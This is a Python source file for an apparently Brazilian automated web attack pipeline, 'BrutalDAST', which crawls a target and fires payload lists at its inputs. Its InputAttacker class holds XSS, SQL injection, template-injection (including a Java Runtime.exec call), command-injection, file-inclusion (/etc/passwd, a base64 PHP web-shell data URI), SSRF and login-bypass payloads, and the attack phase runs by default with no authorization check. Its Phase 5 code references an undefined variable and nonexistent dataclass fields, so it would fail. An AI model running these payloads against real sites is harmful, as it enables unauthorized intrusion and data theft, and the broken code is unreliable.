#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                      ║
║   ██████╗ ██████╗ ██╗   ██╗████████╗ █████╗ ██╗         ██████╗  █████╗ ███████╗████████╗           ║
║   ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔══██╗██║         ██╔══██╗██╔══██╗██╔════╝╚══██╔══╝           ║
║   ██████╔╝██████╔╝██║   ██║   ██║   ███████║██║         ██║  ██║███████║███████╗   ██║              ║
║   ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══██║██║         ██║  ██║██╔══██║╚════██║   ██║              ║
║   ██████╔╝██║  ██║╚██████╔╝   ██║   ██║  ██║███████╗    ██████╔╝██║  ██║███████║   ██║              ║
║   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝              ║
║                                                                                                      ║
║   💀 BRUTAL DAST - Full Pipeline: OSINT → Crawl → Fuzz → ATTACK                                    ║
║                                                                                                      ║
║   "Descobre TUDO. Mapeia TUDO. Ataca TUDO que tem input."                                           ║
║                                                                                                      ║
║   USAGE: Apenas quando NÃO tem código fonte - DAST puro                                             ║
║                                                                                                      ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝

Pipeline completo:
1. OSINT → Detecta se é web, enumera subdomains
2. CRAWL → Crawling profundo + JS analysis
3. FUZZ → Directory/file brute + parameter discovery
4. MAP → Mapeia paineis de login, forms, APIs
5. ATTACK → Integra com BrutalHunter para hunting

O resultado é um CONTEXTO COMPLETO para o cluster AI analisar e encontrar vulns.
"""

import os
import sys
import json
import asyncio
import argparse
import logging
import time
import hashlib
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field, asdict

# Add parent to path
sys.path.insert(0, str(Path(__file__).parent.parent))
sys.path.insert(0, str(Path(__file__).parent))

from brutal_osint import BrutalOSINT, AttackSurface

# Try to import BrutalHunter components
try:
    from hunting.brutal_filter_destroyer import FilterDestroyer, FilterDetector
    HAS_FILTER_DESTROYER = True
except:
    HAS_FILTER_DESTROYER = False

try:
    from hunting.auth_bypass_hunter import AuthBypassHunter
    HAS_AUTH_BYPASS = True
except:
    HAS_AUTH_BYPASS = False

# Try to import Business Logic Hunter
try:
    from recon.business_logic_hunter import BusinessLogicHunter, hunt_business_logic
    HAS_BUSINESS_LOGIC = True
except:
    HAS_BUSINESS_LOGIC = False

# Try to import Supply Chain Scanner
try:
    from recon.brutal_supply_chain import BrutalSupplyChain, scan_supply_chain
    HAS_SUPPLY_CHAIN = True
except:
    HAS_SUPPLY_CHAIN = False

# Try to import JS Deep Analyzer
try:
    from recon.js_deep_analyzer import JSDeepAnalyzer, analyze_js_deep
    HAS_JS_DEEP = True
except:
    HAS_JS_DEEP = False

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════════

BRAINX_PATH = Path(__file__).parent.parent
OUTPUT_DIR = Path.home() / ".brainx" / "dast"
LOGS_DIR = Path.home() / ".brainx" / "logs"
MEMORY_PATH = BRAINX_PATH / "memory"

for d in [OUTPUT_DIR, LOGS_DIR]:
    d.mkdir(parents=True, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | DAST | %(levelname)s | %(message)s',
    handlers=[
        logging.FileHandler(LOGS_DIR / 'brutal_dast.log'),
        logging.StreamHandler()
    ]
)
log = logging.getLogger('BrutalDAST')


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK MODULES
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class VulnFinding:
    """A vulnerability finding"""
    id: str
    url: str
    vuln_type: str
    severity: str  # critical, high, medium, low
    title: str
    description: str
    poc: str
    request: str = ""
    response: str = ""
    cvss: float = 0.0
    confirmed: bool = False
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    
    def to_dict(self) -> Dict:
        return asdict(self)


class InputAttacker:
    """Attack discovered inputs for vulnerabilities"""
    
    # XSS Payloads
    XSS_PAYLOADS = [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '{{constructor.constructor("alert(1)")()}}',
        '${alert(1)}',
        '<img src=x onerror=prompt(1)>',
        '<body onload=alert(1)>',
        "javascript:alert(1)//",
    ]
    
    # SQLi Payloads
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "1' AND '1'='1",
        "1 UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
        "1 AND 1=1",
        "' AND 1=1--",
        "\" OR \"1\"=\"1",
        "admin'--",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
    ]
    
    # SSTI Payloads
    SSTI_PAYLOADS = [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '#{7*7}',
        '*{7*7}',
        '{{config}}',
        '{{self.__class__.__mro__}}',
        '${T(java.lang.Runtime).getRuntime().exec("id")}',
        '{{request.application.__globals__}}',
        '{{[].__class__.__base__.__subclasses__()}}',
    ]
    
    # Command Injection Payloads
    CMDI_PAYLOADS = [
        '; id',
        '| id',
        '|| id',
        '`id`',
        '$(id)',
        '; whoami',
        '| whoami',
        '\n id',
        '; sleep 5',
        '| sleep 5',
        '`sleep 5`',
        '; ping -c 1 127.0.0.1',
    ]
    
    # LFI Payloads
    LFI_PAYLOADS = [
        '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '/etc/passwd',
        '..\\..\\..\\windows\\win.ini',
        'file:///etc/passwd',
        '/proc/self/environ',
        '/var/log/apache2/access.log',
        'php://filter/convert.base64-encode/resource=index.php',
        'php://input',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+',
    ]
    
    # SSRF Payloads
    SSRF_PAYLOADS = [
        'http://127.0.0.1',
        'http://localhost',
        'http://127.0.0.1:22',
        'http://127.0.0.1:6379',
        'http://169.254.169.254/latest/meta-data/',
        'http://[::1]',
        'http://0.0.0.0',
        'gopher://127.0.0.1:25/',
        'dict://127.0.0.1:6379/INFO',
        'file:///etc/passwd',
    ]
    
    # Auth Bypass Payloads
    AUTH_BYPASS_PAYLOADS = [
        {"user": "admin'--", "pass": "x"},
        {"user": "' OR '1'='1", "pass": "' OR '1'='1"},
        {"user": "admin", "pass": "' OR '1'='1"},
        {"user": "admin", "pass": []},
        {"user": "admin", "pass": True},
        {"user": ["admin"], "pass": "x"},
        {"user": "admin\x00", "pass": "x"},
    ]
    
    def __init__(self, session=None):
        self.session = session
        self.findings: List[VulnFinding] = []
        import aiohttp
        self.aiohttp = aiohttp
    
    async def attack_target(self, target: Dict) -> List[VulnFinding]:
        """Attack a single target with appropriate payloads"""
        findings = []
        
        url = target.get('url', '')
        target_type = target.get('type', 'endpoint')
        params = target.get('params', [])
        attacks = target.get('attacks', ['xss', 'sqli'])
        
        log.info(f"  🎯 Attacking: {url[:60]}...")
        
        connector = self.aiohttp.TCPConnector(ssl=False, limit=10)
        timeout = self.aiohttp.ClientTimeout(total=15)
        
        async with self.aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            
            # XSS
            if 'xss' in attacks:
                xss_findings = await self._test_xss(session, url, params)
                findings.extend(xss_findings)
            
            # SQLi
            if 'sqli' in attacks:
                sqli_findings = await self._test_sqli(session, url, params)
                findings.extend(sqli_findings)
            
            # SSTI
            if 'ssti' in attacks:
                ssti_findings = await self._test_ssti(session, url, params)
                findings.extend(ssti_findings)
            
            # Command Injection
            if 'cmdi' in attacks:
                cmdi_findings = await self._test_cmdi(session, url, params)
                findings.extend(cmdi_findings)
            
            # LFI
            if 'lfi' in attacks:
                lfi_findings = await self._test_lfi(session, url, params)
                findings.extend(lfi_findings)
            
            # Auth Bypass (for login panels)
            if 'auth_bypass' in attacks and target_type == 'login_panel':
                auth_findings = await self._test_auth_bypass(session, target)
                findings.extend(auth_findings)
        
        self.findings.extend(findings)
        return findings
    
    async def _test_xss(self, session, url: str, params: List[str]) -> List[VulnFinding]:
        """Test for XSS"""
        findings = []
        
        for param in params[:10]:  # Limit params
            for payload in self.XSS_PAYLOADS[:5]:  # Limit payloads
                test_url = self._inject_param(url, param, payload)
                
                try:
                    async with session.get(test_url, allow_redirects=True) as resp:
                        text = await resp.text()
                        
                        if payload in text or payload.replace('<', '&lt;') not in text and '<' in payload:
                            # Check if actually reflected
                            if payload in text:
                                findings.append(VulnFinding(
                                    id=hashlib.md5(f"{url}{param}xss".encode()).hexdigest()[:12],
                                    url=url,
                                    vuln_type='xss',
                                    severity='medium',
                                    title=f'Reflected XSS in parameter: {param}',
                                    description=f'XSS payload reflected in response without encoding',
                                    poc=test_url,
                                    request=f'GET {test_url}',
                                    response=text[:500],
                                    cvss=6.1
                                ))
                                log.warning(f"    ⚡ XSS found in {param}!")
                                break
                except:
                    pass
        
        return findings
    
    async def _test_sqli(self, session, url: str, params: List[str]) -> List[VulnFinding]:
        """Test for SQL Injection"""
        findings = []
        
        sqli_errors = [
            'sql syntax', 'mysql', 'sqlite', 'postgresql', 'oracle',
            'syntax error', 'unclosed quotation', 'quoted string not properly terminated',
            'sqlstate', 'odbc', 'jdbc', 'sql server'
        ]
        
        for param in params[:10]:
            for payload in self.SQLI_PAYLOADS[:5]:
                test_url = self._inject_param(url, param, payload)
                
                try:
                    async with session.get(test_url) as resp:
                        text = (await resp.text()).lower()
                        
                        # Check for SQL errors
                        for error in sqli_errors:
                            if error in text:
                                findings.append(VulnFinding(
                                    id=hashlib.md5(f"{url}{param}sqli".encode()).hexdigest()[:12],
                                    url=url,
                                    vuln_type='sqli',
                                    severity='high',
                                    title=f'SQL Injection in parameter: {param}',
                                    description=f'SQL error message disclosed. Error: {error}',
                                    poc=test_url,
                                    request=f'GET {test_url}',
                                    response=text[:500],
                                    cvss=8.6
                                ))
                                log.warning(f"    💉 SQLi found in {param}!")
                                return findings
                except:
                    pass
        
        return findings
    
    async def _test_ssti(self, session, url: str, params: List[str]) -> List[VulnFinding]:
        """Test for Server-Side Template Injection"""
        findings = []
        
        for param in params[:10]:
            # Test with math expression
            payload = '{{7*7}}'
            test_url = self._inject_param(url, param, payload)
            
            try:
                async with session.get(test_url) as resp:
                    text = await resp.text()
                    
                    if '49' in text:
                        findings.append(VulnFinding(
                            id=hashlib.md5(f"{url}{param}ssti".encode()).hexdigest()[:12],
                            url=url,
                            vuln_type='ssti',
                            severity='critical',
                            title=f'SSTI in parameter: {param}',
                            description='Server-side template injection - expression evaluated',
                            poc=test_url,
                            request=f'GET {test_url}',
                            response=text[:500],
                            cvss=9.8
                        ))
                        log.warning(f"    🔥 SSTI found in {param}!")
                        break
            except:
                pass
        
        return findings
    
    async def _test_cmdi(self, session, url: str, params: List[str]) -> List[VulnFinding]:
        """Test for Command Injection"""
        findings = []
        
        # Time-based detection
        for param in params[:10]:
            payload = '; sleep 5'
            test_url = self._inject_param(url, param, payload)
            
            try:
                start = time.time()
                async with session.get(test_url, timeout=self.aiohttp.ClientTimeout(total=10)) as resp:
                    elapsed = time.time() - start
                    
                    if elapsed > 4:
                        findings.append(VulnFinding(
                            id=hashlib.md5(f"{url}{param}cmdi".encode()).hexdigest()[:12],
                            url=url,
                            vuln_type='cmdi',
                            severity='critical',
                            title=f'Command Injection in parameter: {param}',
                            description=f'Time-based command injection detected (delay: {elapsed:.1f}s)',
                            poc=test_url,
                            request=f'GET {test_url}',
                            cvss=9.8
                        ))
                        log.warning(f"    💀 CMDI found in {param}!")
                        break
            except:
                pass
        
        return findings
    
    async def _test_lfi(self, session, url: str, params: List[str]) -> List[VulnFinding]:
        """Test for Local File Inclusion"""
        findings = []
        
        lfi_indicators = ['root:', 'daemon:', '[extensions]', '<?php', '<?=']
        
        for param in params[:10]:
            for payload in self.LFI_PAYLOADS[:5]:
                test_url = self._inject_param(url, param, payload)
                
                try:
                    async with session.get(test_url) as resp:
                        text = await resp.text()
                        
                        for indicator in lfi_indicators:
                            if indicator in text:
                                findings.append(VulnFinding(
                                    id=hashlib.md5(f"{url}{param}lfi".encode()).hexdigest()[:12],
                                    url=url,
                                    vuln_type='lfi',
                                    severity='high',
                                    title=f'LFI in parameter: {param}',
                                    description=f'Local file content disclosed',
                                    poc=test_url,
                                    request=f'GET {test_url}',
                                    response=text[:500],
                                    cvss=7.5
                                ))
                                log.warning(f"    📁 LFI found in {param}!")
                                return findings
                except:
                    pass
        
        return findings
    
    async def _test_auth_bypass(self, session, target: Dict) -> List[VulnFinding]:
        """Test for authentication bypass"""
        findings = []
        url = target.get('url', '')
        
        for bypass in self.AUTH_BYPASS_PAYLOADS[:5]:
            try:
                # Try POST to login
                async with session.post(url, data=bypass) as resp:
                    text = await resp.text()
                    
                    # Check for success indicators
                    if resp.status == 302 or 'dashboard' in text.lower() or 'welcome' in text.lower():
                        findings.append(VulnFinding(
                            id=hashlib.md5(f"{url}auth_bypass".encode()).hexdigest()[:12],
                            url=url,
                            vuln_type='auth_bypass',
                            severity='critical',
                            title='Authentication Bypass',
                            description=f'Auth bypass with payload: {bypass}',
                            poc=json.dumps(bypass),
                            cvss=9.8
                        ))
                        log.warning(f"    🔓 AUTH BYPASS FOUND!")
                        break
            except:
                pass
        
        return findings
    
    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        import urllib.parse
        
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if param in params:
            params[param] = [payload]
        else:
            params[param] = [payload]
        
        new_query = urllib.parse.urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN DAST ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class BrutalDAST:
    """
    Complete DAST pipeline:
    1. OSINT reconnaissance
    2. Attack surface mapping
    3. Vulnerability scanning
    4. Report generation
    """
    
    def __init__(self, target: str, mode: str = 'full', attack: bool = True):
        self.target = target
        self.mode = mode
        self.attack_enabled = attack
        
        self.session_id = hashlib.md5(f"{target}{time.time()}".encode()).hexdigest()[:12]
        self.output_dir = OUTPUT_DIR / self.session_id
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        self.osint = None
        self.attack_surface = None
        self.findings: List[VulnFinding] = []
        self.attacker = InputAttacker()
        
        log.info("")
        log.info("╔" + "═" * 68 + "╗")
        log.info("║   💀 BRUTAL DAST - Complete Black-box Testing Pipeline" + " " * 12 + "║")
        log.info("╠" + "═" * 68 + "╣")
        log.info(f"║   Target: {target[:55]:<55} ║")
        log.info(f"║   Mode: {mode:<58} ║")
        log.info(f"║   Attack: {'ENABLED' if attack else 'DISABLED':<57} ║")
        log.info(f"║   Session: {self.session_id:<56} ║")
        log.info("╚" + "═" * 68 + "╝")
        log.info("")
    
    async def run(self) -> Dict:
        """Execute complete DAST pipeline"""
        start_time = time.time()
        results = {
            'session_id': self.session_id,
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'recon': {},
            'findings': [],
            'stats': {}
        }
        
        # Phase 1: OSINT Reconnaissance
        log.info("=" * 70)
        log.info("🔍 PHASE 1: OSINT RECONNAISSANCE")
        log.info("=" * 70)
        
        self.osint = BrutalOSINT(self.target, mode=self.mode)
        self.attack_surface = await self.osint.run()
        
        if not self.attack_surface.is_web:
            log.error("Target is not a web application. Aborting.")
            return results
        
        results['recon'] = {
            'endpoints': len(self.attack_surface.endpoints),
            'parameters': len(self.attack_surface.parameters),
            'login_panels': len(self.attack_surface.login_panels),
            'api_endpoints': len(self.attack_surface.api_endpoints),
            'js_secrets': len(self.attack_surface.js_secrets),
            'technologies': [t.name for t in self.attack_surface.technologies]
        }
        
        # Phase 2: Attack
        if self.attack_enabled:
            log.info("")
            log.info("=" * 70)
            log.info("⚔️ PHASE 2: VULNERABILITY SCANNING")
            log.info("=" * 70)
            
            targets = self.osint.get_brutalhunter_targets()
            
            # Attack high priority first
            log.info(f"\n🔴 HIGH PRIORITY TARGETS ({len(targets['high_priority'])})")
            for target in targets['high_priority'][:20]:
                findings = await self.attacker.attack_target(target)
                self.findings.extend(findings)
            
            # Then medium
            log.info(f"\n🟡 MEDIUM PRIORITY TARGETS ({len(targets['medium_priority'])})")
            for target in targets['medium_priority'][:30]:
                findings = await self.attacker.attack_target(target)
                self.findings.extend(findings)
            
            # Then low priority (limited)
            log.info(f"\n🟢 LOW PRIORITY TARGETS ({len(targets['low_priority'])})")
            for target in targets['low_priority'][:20]:
                findings = await self.attacker.attack_target(target)
                self.findings.extend(findings)
            
            results['findings'] = [f.to_dict() for f in self.findings]
        
        # Phase 3: Business Logic Testing
        if self.attack_enabled and HAS_BUSINESS_LOGIC:
            log.info("")
            log.info("=" * 70)
            log.info("💼 PHASE 3: BUSINESS LOGIC VULNERABILITY HUNTING")
            log.info("=" * 70)
            
            # Prepare attack surface for business logic hunter
            biz_attack_surface = {
                'base_url': self.target,
                'endpoints': [{'url': ep.url, 'method': ep.method} for ep in self.attack_surface.endpoints],
                'forms': [{'action': f.get('action',''), 'method': f.get('method',''), 'inputs': f.get('inputs',[])} for f in self.attack_surface.forms],
                'login_panels': [{'url': lp.url, 'mfa': lp.has_mfa} for lp in self.attack_surface.login_panels],
                'api_endpoints': [{'url': api.url, 'method': api.method} for api in self.attack_surface.api_endpoints],
                'parameters': list(self.attack_surface.parameters)
            }
            
            # Run business logic hunter
            biz_hunter = BusinessLogicHunter()
            biz_findings = await biz_hunter.hunt(biz_attack_surface)
            
            # Convert business logic findings to VulnFinding format
            for bf in biz_findings:
                self.findings.append(VulnFinding(
                    id=bf.id,
                    url=bf.url,
                    vuln_type=f'business_logic:{bf.vuln_type}',
                    severity=bf.severity,
                    title=bf.title,
                    description=bf.description,
                    poc='\n'.join(bf.poc_steps),
                    request=bf.request,
                    response=bf.response,
                    cvss=bf.cvss,
                    confirmed=False
                ))
            
            # Save business logic report separately
            biz_report = biz_hunter.generate_report()
            with open(self.output_dir / 'BUSINESS_LOGIC_REPORT.md', 'w') as f:
                f.write(biz_report)
            
            log.info(f"\n💼 Business Logic: {len(biz_findings)} findings")
            
            # Update findings in results
            results['findings'] = [f.to_dict() for f in self.findings]
            results['business_logic_findings'] = len(biz_findings)
        
        # Phase 4: Supply Chain Analysis (Parallel Task)
        if self.attack_enabled and HAS_SUPPLY_CHAIN:
            log.info("")
            log.info("=" * 70)
            log.info("🔗 PHASE 4: SUPPLY CHAIN ANALYSIS")
            log.info("=" * 70)
            
            supply_scanner = BrutalSupplyChain(self.target)
            supply_results = await supply_scanner.run()
            
            # Convert supply chain findings to VulnFinding format
            for sf in supply_scanner.findings:
                vuln_type = f'supply_chain:{sf.vuln_type}'
                if sf.cve_id:
                    vuln_type = f'cve:{sf.cve_id}'
                
                self.findings.append(VulnFinding(
                    id=sf.id,
                    url=sf.affected_url or self.target,
                    vuln_type=vuln_type,
                    severity=sf.severity,
                    title=sf.title,
                    description=sf.description,
                    poc=sf.poc,
                    cvss=sf.cvss,
                    confirmed=sf.exploit_available
                ))
            
            # Copy supply chain report
            import shutil
            supply_report = supply_scanner.output_dir / 'SUPPLY_CHAIN_REPORT.md'
            if supply_report.exists():
                shutil.copy(supply_report, self.output_dir / 'SUPPLY_CHAIN_REPORT.md')
            
            # Add to results
            results['supply_chain'] = {
                'technologies': len(supply_scanner.dependencies),
                'package_deps': len(supply_scanner.package_deps),
                'exposed_files': len(supply_scanner.exposed_files),
                'git_exposed': supply_scanner.git_info.get('exposed', False),
                'findings': len(supply_scanner.findings)
            }
            
            log.info(f"\n🔗 Supply Chain: {len(supply_scanner.findings)} findings")
            if supply_scanner.git_info.get('exposed'):
                log.warning(f"   💀 GIT EXPOSED! Full source code dump possible!")
            
            # Update findings in results
            results['findings'] = [f.to_dict() for f in self.findings]
        
        # Phase 5: JS Deep Analysis (Sourcemaps, Secrets, JWT)
        if HAS_JS_DEEP:
            log.info("")
            log.info("═" * 60)
            log.info("🔍 PHASE 5: JS DEEP ANALYSIS (Sourcemaps, Secrets, JWT)")
            log.info("═" * 60)
            
            js_analyzer = JSDeepAnalyzer(target)
            js_result = await js_analyzer.analyze()
            
            # Convert JS findings to VulnFinding format
            for secret in js_result.secrets:
                if secret.valid or secret.severity in ['critical', 'high']:
                    finding = VulnFinding(
                        vuln_type='exposed_secret',
                        severity='critical' if secret.valid else secret.severity,
                        endpoint=secret.source_file,
                        method='GET',
                        parameter=secret.type,
                        payload='',
                        evidence=f"Secret: {secret.value[:30]}...",
                        description=f"Exposed {secret.type}: {secret.validation_result or 'Found in JS'}"
                    )
                    self.findings.append(finding)
            
            # Sourcemap exposure findings
            if js_result.sourcemaps:
                for sm in js_result.sourcemaps:
                    finding = VulnFinding(
                        vuln_type='sourcemap_exposure',
                        severity='high',
                        endpoint=sm.url,
                        method='GET',
                        parameter='',
                        payload='',
                        evidence=f"Exposed {sm.original_files} source files",
                        description=f"Sourcemap exposes original source code! {sm.original_files} files reconstructable"
                    )
                    self.findings.append(finding)
            
            # Add to results
            results['js_analysis'] = {
                'js_files': len(js_result.js_files),
                'sourcemaps': len(js_result.sourcemaps),
                'source_reconstructed': js_result.reconstructed_source,
                'secrets_found': len(js_result.secrets),
                'secrets_valid': len([s for s in js_result.secrets if s.valid]),
                'jwts_found': len(js_result.jwts),
                'endpoints_found': len(js_result.endpoints),
                'graphql_endpoints': len(js_result.graphql_endpoints)
            }
            
            # Copy JS analysis report
            import shutil
            js_report = js_analyzer.output_dir / 'JS_DEEP_REPORT.md'
            if js_report.exists():
                shutil.copy(js_report, self.output_dir / 'JS_DEEP_REPORT.md')
            
            log.info(f"\n🔍 JS Deep: {len(js_result.secrets)} secrets, {len(js_result.sourcemaps)} sourcemaps")
            if js_result.reconstructed_source:
                log.warning(f"   🔓 SOURCE CODE RECONSTRUCTED from sourcemaps!")
            valid_secrets = [s for s in js_result.secrets if s.valid]
            if valid_secrets:
                log.warning(f"   🔥 {len(valid_secrets)} VALID SECRETS CONFIRMED!")
            
            # Update findings in results
            results['findings'] = [f.to_dict() for f in self.findings]
        
        # Statistics
        elapsed = time.time() - start_time
        results['stats'] = {
            'elapsed_time': elapsed,
            'total_endpoints': len(self.attack_surface.endpoints),
            'total_parameters': len(self.attack_surface.parameters),
            'total_findings': len(self.findings),
            'critical': len([f for f in self.findings if f.severity == 'critical']),
            'high': len([f for f in self.findings if f.severity == 'high']),
            'medium': len([f for f in self.findings if f.severity == 'medium']),
        }
        
        # Save results
        await self._save_results(results)
        
        # Print summary
        self._print_summary(results, elapsed)
        
        return results
    
    async def _save_results(self, results: Dict):
        """Save all results"""
        # Full results JSON
        with open(self.output_dir / 'dast_results.json', 'w') as f:
            json.dump(results, f, indent=2, default=str)
        
        # Findings only
        if self.findings:
            with open(self.output_dir / 'findings.json', 'w') as f:
                json.dump([f.to_dict() for f in self.findings], f, indent=2)
        
        # Generate report
        report = self._generate_report(results)
        with open(self.output_dir / 'DAST_REPORT.md', 'w') as f:
            f.write(report)
        
        # Save to memory for BrainX
        memory_file = MEMORY_PATH / 'dast_results.json'
        existing = {}
        if memory_file.exists():
            try:
                existing = json.loads(memory_file.read_text())
            except:
                pass
        
        existing[self.session_id] = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'output_dir': str(self.output_dir),
            'findings_count': len(self.findings),
            'critical': results['stats'].get('critical', 0),
            'high': results['stats'].get('high', 0)
        }
        
        memory_file.write_text(json.dumps(existing, indent=2))
    
    def _generate_report(self, results: Dict) -> str:
        """Generate markdown report"""
        lines = []
        lines.append("# 💀 BRUTAL DAST REPORT")
        lines.append("")
        lines.append(f"**Target:** {self.target}")
        lines.append(f"**Session:** {self.session_id}")
        lines.append(f"**Date:** {results['timestamp']}")
        lines.append(f"**Duration:** {results['stats'].get('elapsed_time', 0):.1f}s")
        lines.append("")
        
        # Summary
        lines.append("## 📊 Summary")
        lines.append("")
        lines.append(f"| Metric | Value |")
        lines.append(f"|--------|-------|")
        lines.append(f"| Endpoints Discovered | {results['recon'].get('endpoints', 0)} |")
        lines.append(f"| Parameters Found | {results['recon'].get('parameters', 0)} |")
        lines.append(f"| Login Panels | {results['recon'].get('login_panels', 0)} |")
        lines.append(f"| API Endpoints | {results['recon'].get('api_endpoints', 0)} |")
        lines.append(f"| Secrets in JS | {results['recon'].get('js_secrets', 0)} |")
        lines.append("")
        
        # Findings
        lines.append("## 🚨 Vulnerability Findings")
        lines.append("")
        
        if not self.findings:
            lines.append("No vulnerabilities found.")
        else:
            lines.append(f"**Total:** {len(self.findings)} findings")
            lines.append(f"- 🔴 Critical: {results['stats'].get('critical', 0)}")
            lines.append(f"- 🟠 High: {results['stats'].get('high', 0)}")
            lines.append(f"- 🟡 Medium: {results['stats'].get('medium', 0)}")
            lines.append("")
            
            # Group by type
            by_type = {}
            for f in self.findings:
                if f.vuln_type not in by_type:
                    by_type[f.vuln_type] = []
                by_type[f.vuln_type].append(f)
            
            for vuln_type, findings in sorted(by_type.items()):
                lines.append(f"### {vuln_type.upper()}")
                lines.append("")
                for f in findings:
                    severity_icon = {'critical': '🔴', 'high': '🟠', 'medium': '🟡', 'low': '🟢'}.get(f.severity, '⚪')
                    lines.append(f"#### {severity_icon} {f.title}")
                    lines.append(f"- **URL:** `{f.url}`")
                    lines.append(f"- **Severity:** {f.severity.upper()} (CVSS: {f.cvss})")
                    lines.append(f"- **Description:** {f.description}")
                    lines.append(f"- **PoC:** `{f.poc[:100]}...`" if len(f.poc) > 100 else f"- **PoC:** `{f.poc}`")
                    lines.append("")
        
        # Technologies
        if results['recon'].get('technologies'):
            lines.append("## 🔧 Technologies")
            lines.append("")
            for tech in results['recon']['technologies']:
                lines.append(f"- {tech}")
            lines.append("")
        
        # Login Panels
        if self.attack_surface and self.attack_surface.login_panels:
            lines.append("## 🔐 Login Panels")
            lines.append("")
            for panel in self.attack_surface.login_panels:
                lines.append(f"- **{panel.url}**")
                lines.append(f"  - Username: `{panel.username_field}`")
                lines.append(f"  - Password: `{panel.password_field}`")
                lines.append(f"  - CSRF: `{panel.csrf_field or 'None'}`")
                lines.append("")
        
        # JS Secrets
        if self.attack_surface and self.attack_surface.js_secrets:
            lines.append("## 🔑 Secrets Found in JavaScript")
            lines.append("")
            for secret in self.attack_surface.js_secrets[:20]:
                lines.append(f"- [{secret.get('type', 'unknown')}] `{secret.get('value', '')[:60]}...`")
            lines.append("")
        
        lines.append("---")
        lines.append("*Generated by BrutalDAST - BrainX Security Research Platform*")
        
        return "\n".join(lines)
    
    def _print_summary(self, results: Dict, elapsed: float):
        """Print final summary"""
        log.info("")
        log.info("=" * 70)
        log.info("✅ DAST SCAN COMPLETE")
        log.info("=" * 70)
        log.info("")
        log.info(f"  ⏱️ Total time: {elapsed:.1f}s")
        log.info(f"  📊 Endpoints: {results['recon'].get('endpoints', 0)}")
        log.info(f"  📝 Parameters: {results['recon'].get('parameters', 0)}")
        log.info(f"  🔐 Login panels: {results['recon'].get('login_panels', 0)}")
        log.info("")
        log.info(f"  🚨 FINDINGS:")
        log.info(f"     🔴 Critical: {results['stats'].get('critical', 0)}")
        log.info(f"     🟠 High: {results['stats'].get('high', 0)}")
        log.info(f"     🟡 Medium: {results['stats'].get('medium', 0)}")
        log.info("")
        log.info(f"  📁 Results: {self.output_dir}")
        log.info(f"  📄 Report: {self.output_dir / 'DAST_REPORT.md'}")
        log.info("")
        
        if results['stats'].get('critical', 0) > 0:
            log.warning("  ⚠️ CRITICAL VULNERABILITIES FOUND! Review immediately.")
        
        log.info("")


# ═══════════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description='💀 BRUTAL DAST - Complete Black-box Security Testing',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Full scan with attack
  python brutal_dast.py --target https://example.com
  
  # Quick recon only (no attack)
  python brutal_dast.py --target https://example.com --mode quick --no-attack
  
  # Stealth mode (slow, less noise)
  python brutal_dast.py --target https://example.com --mode stealth
  
  # Resume previous session
  python brutal_dast.py --resume abc123
        """
    )
    
    parser.add_argument('--target', '-t', help='Target URL')
    parser.add_argument('--mode', '-m', choices=['full', 'quick', 'stealth'], default='full')
    parser.add_argument('--no-attack', action='store_true', help='Disable attack phase (recon only)')
    parser.add_argument('--resume', '-r', help='Resume session ID')
    parser.add_argument('--quiet', '-q', action='store_true')
    
    args = parser.parse_args()
    
    if not args.target and not args.resume:
        parser.print_help()
        sys.exit(1)
    
    if args.quiet:
        log.setLevel(logging.WARNING)
    
    dast = BrutalDAST(
        target=args.target,
        mode=args.mode,
        attack=not args.no_attack
    )
    
    results = asyncio.run(dast.run())
    
    # Exit code based on findings
    if results.get('stats', {}).get('critical', 0) > 0:
        sys.exit(2)  # Critical findings
    elif results.get('stats', {}).get('high', 0) > 0:
        sys.exit(1)  # High findings
    else:
        sys.exit(0)  # Clean or only low/medium


if __name__ == '__main__':
    main()
